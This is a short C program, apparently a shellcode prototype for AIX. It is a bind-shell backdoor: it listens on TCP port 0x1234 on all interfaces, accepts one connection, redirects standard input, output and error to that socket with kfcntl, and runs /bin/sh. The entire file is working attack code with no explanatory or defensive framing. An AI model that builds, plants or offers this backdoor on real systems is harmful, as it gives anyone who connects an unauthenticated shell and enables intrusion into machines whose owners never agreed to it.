#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>

int soc,cli,i;
struct sockaddr_in serv_addr;

int main()
{
    serv_addr.sin_family=2;
    serv_addr.sin_addr.s_addr=0;
    serv_addr.sin_port=0x1234;
    soc=socket(2,1,0);
    bind(soc,(struct sockaddr *)&serv_addr,0x10);
    listen(soc,5);
    cli=accept(soc,0,0);

    for (i=2;i>=0;i--) {
        close(i);
        kfcntl(cli, 0, i);
    }

    execve("/bin/sh", 0, 0);
}
